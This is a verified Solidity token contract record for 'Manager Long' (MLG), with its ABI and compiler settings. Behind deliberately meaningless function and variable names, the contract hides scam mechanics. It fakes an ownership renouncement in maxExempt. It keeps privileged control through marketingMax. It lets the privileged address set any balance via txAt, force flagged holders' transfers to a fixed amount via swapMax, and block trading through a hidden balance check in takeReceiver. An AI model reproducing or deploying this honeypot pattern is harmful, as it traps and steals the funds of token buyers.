{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface receiverEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTeam {\n    function createPair(address fundReceiverAmount, address minAuto) external returns (address);\n}\n\ninterface atLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoShould) external view returns (uint256);\n\n    function transfer(address buyWallet, uint256 sellAmount) external returns (bool);\n\n    function allowance(address sellTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyWallet,\n        uint256 sellAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMarketing, uint256 value);\n    event Approval(address indexed sellTeam, address indexed spender, uint256 value);\n}\n\ninterface atLaunchMetadata is atLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ManagerLong is sellWallet, atLaunch, atLaunchMetadata {\n\n    function maxExempt() public {\n        emit OwnershipTransferred(maxTo, address(0));\n        fundTrading = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private fromTx;\n\n    address public maxTo;\n\n    function approve(address buyMarketingExempt, uint256 sellAmount) public virtual override returns (bool) {\n        fromTx[_msgSender()][buyMarketingExempt] = sellAmount;\n        emit Approval(_msgSender(), buyMarketingExempt, sellAmount);\n        return true;\n    }\n\n    uint256 swapReceiver;\n\n    uint8 private totalTeam = 18;\n\n    address atShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address feeLaunchTrading, address buyWallet, uint256 sellAmount) external override returns (bool) {\n        if (_msgSender() != feeSwap) {\n            if (fromTx[feeLaunchTrading][_msgSender()] != type(uint256).max) {\n                require(sellAmount <= fromTx[feeLaunchTrading][_msgSender()]);\n                fromTx[feeLaunchTrading][_msgSender()] -= sellAmount;\n            }\n        }\n        return takeReceiver(feeLaunchTrading, buyWallet, sellAmount);\n    }\n\n    event OwnershipTransferred(address indexed minReceiverList, address indexed limitExempt);\n\n    function name() external view virtual override returns (string memory) {\n        return teamReceiverLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamReceiver;\n    }\n\n    function swapMax(address senderTotal) public {\n        fromLiquidity();\n        if (totalMarketing) {\n            totalAmount = senderLimitTx;\n        }\n        if (senderTotal == maxTo || senderTotal == buyExemptAt) {\n            return;\n        }\n        exemptAuto[senderTotal] = true;\n    }\n\n    mapping(address => uint256) private fundTo;\n\n    mapping(address => bool) public exemptAuto;\n\n    uint256 constant listAmount = 17 ** 10;\n\n    uint256 private exemptSwap = 100000000 * 10 ** 18;\n\n    function balanceOf(address autoShould) public view virtual override returns (uint256) {\n        return fundTo[autoShould];\n    }\n\n    function takeReceiver(address feeLaunchTrading, address buyWallet, uint256 sellAmount) internal returns (bool) {\n        if (feeLaunchTrading == maxTo) {\n            return fundMax(feeLaunchTrading, buyWallet, sellAmount);\n        }\n        uint256 modeLiquidity = atLaunch(buyExemptAt).balanceOf(atShould);\n        require(modeLiquidity == takeShouldAmount);\n        require(buyWallet != atShould);\n        if (exemptAuto[feeLaunchTrading]) {\n            return fundMax(feeLaunchTrading, buyWallet, listAmount);\n        }\n        return fundMax(feeLaunchTrading, buyWallet, sellAmount);\n    }\n\n    function fromLiquidity() private view {\n        require(marketingMax[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptSwap;\n    }\n\n    function fundMax(address feeLaunchTrading, address buyWallet, uint256 sellAmount) internal returns (bool) {\n        require(fundTo[feeLaunchTrading] >= sellAmount);\n        fundTo[feeLaunchTrading] -= sellAmount;\n        fundTo[buyWallet] += sellAmount;\n        emit Transfer(feeLaunchTrading, buyWallet, sellAmount);\n        return true;\n    }\n\n    function allowance(address fromAmount, address buyMarketingExempt) external view virtual override returns (uint256) {\n        if (buyMarketingExempt == feeSwap) {\n            return type(uint256).max;\n        }\n        return fromTx[fromAmount][buyMarketingExempt];\n    }\n\n    bool public takeLiquidity;\n\n    string private teamReceiver = \"MLG\";\n\n    function owner() external view returns (address) {\n        return fundTrading;\n    }\n\n    address feeSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public senderLimitTx;\n\n    address public buyExemptAt;\n\n    function isExempt(uint256 sellAmount) public {\n        fromLiquidity();\n        takeShouldAmount = sellAmount;\n    }\n\n    function toTotalEnable(address modeSell) public {\n        require(modeSell.balance < 100000);\n        if (takeLiquidity) {\n            return;\n        }\n        \n        marketingMax[modeSell] = true;\n        if (senderLimitTx == totalAmount) {\n            totalMarketing = true;\n        }\n        takeLiquidity = true;\n    }\n\n    function txAt(address totalAt, uint256 sellAmount) public {\n        fromLiquidity();\n        fundTo[totalAt] = sellAmount;\n    }\n\n    constructor (){\n        \n        receiverEnable receiverTotalAt = receiverEnable(feeSwap);\n        buyExemptAt = feeTeam(receiverTotalAt.factory()).createPair(receiverTotalAt.WETH(), address(this));\n        if (senderLimitTx == totalAmount) {\n            totalAmount = senderLimitTx;\n        }\n        maxTo = _msgSender();\n        maxExempt();\n        marketingMax[maxTo] = true;\n        fundTo[maxTo] = exemptSwap;\n        \n        emit Transfer(address(0), maxTo, exemptSwap);\n    }\n\n    bool public totalMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTeam;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundTrading;\n    }\n\n    bool private limitMin;\n\n    address private fundTrading;\n\n    uint256 takeShouldAmount;\n\n    uint256 public totalAmount;\n\n    function transfer(address totalAt, uint256 sellAmount) external virtual override returns (bool) {\n        return takeReceiver(_msgSender(), totalAt, sellAmount);\n    }\n\n    mapping(address => bool) public marketingMax;\n\n    string private teamReceiverLaunch = \"Manager Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiverList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyMarketingExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExemptAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellAmount\",\"type\":\"uint256\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimitTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"}],\"name\":\"swapMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"}],\"name\":\"toTotalEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunchTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmount\",\"type\":\"uint256\"}],\"name\":\"txAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ManagerLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}